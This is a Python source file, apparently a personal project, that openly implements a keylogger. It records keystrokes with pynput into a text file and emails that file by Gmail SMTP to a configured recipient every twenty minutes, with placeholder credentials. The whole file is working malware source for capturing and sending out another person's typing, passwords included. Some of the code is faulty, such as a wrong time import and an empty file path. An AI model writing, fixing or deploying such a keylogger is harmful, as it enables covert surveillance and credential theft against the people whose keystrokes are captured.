#Jacob Beason, 12/9/25
# This program logs keystrokes using the pynput lib and saves them to a txt file, then using SMTP sends the file to an email address on a desired interval
#

import smtplib
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
from time import time 



def send_email_with_attachment(sender_email, sender_password, recipient_email, subject, body, file_path, smtp_server="smtp.gmail.com", smtp_port=587):
    
    # Create message container
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    
    # Attach the body text
    msg.attach(MIMEText(body, 'plain'))
    
    # Open and attach the file
    try:
        with open(file_path, 'rb') as attachment:
            # Create MIMEBase object
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        
        # Encode file in base64
        encoders.encode_base64(part)
        
        # Adds header with filename
        filename = os.path.basename(file_path)
        part.add_header('Content-Disposition', f'attachment; filename= {filename}')
        
        # Attaches the file to the message
        msg.attach(part)
        
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found")
        return False
    except Exception as e:
        print(f"Error attaching file: {e}")
        return False
    
    # Send the email
    try:
        # Creates SMTP session
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Enable TLS encryption
        
        # Login
        server.login(sender_email, sender_password)
        
        # Send email
        server.send_message(msg)
        server.quit()
        
        print(f"Email sent successfully to {recipient_email}")
        return True
        
    except smtplib.SMTPAuthenticationError:
        print("Authentication failed. Check your email and password.")
        return False
    except smtplib.SMTPException as ex:
        print(f"SMTP error occurred: {ex}")
        return False
    except Exception as ex:
        print(f"Error sending email: {ex}")
        return False



    
    
#Counts down desired time between emails  
def email_loop(seconds, num_repetitions=None):
    
    if num_repetitions is None:
        while True:
            send_email_with_attachment(sender_email=SENDER_EMAIL,sender_password=SENDER_PASSWORD,recipient_email=RECIPIENT_EMAIL,subject=subject,body=body,file_path=file_path)
            time.sleep(seconds)
          


# Detects keystrokes and writes them to a txt file
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey: #enter your txt file name
        try:
            char = key.char
            logKey.write(char)
        except:
                print("Error getting char")


if __name__ == "__main__":
    # Call keylogger
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

   

    # Configuration
    SENDER_EMAIL = "Enter sender email"
    SENDER_PASSWORD = "Enter app pass"  # Use gmail app password
    RECIPIENT_EMAIL = "Enter recipeient email"
    
    # Email details
    subject = "keylog"
    body = ""
    file_path = ""  # Path to txt file

    #Call email loop
    email_loop(1200,None)
    
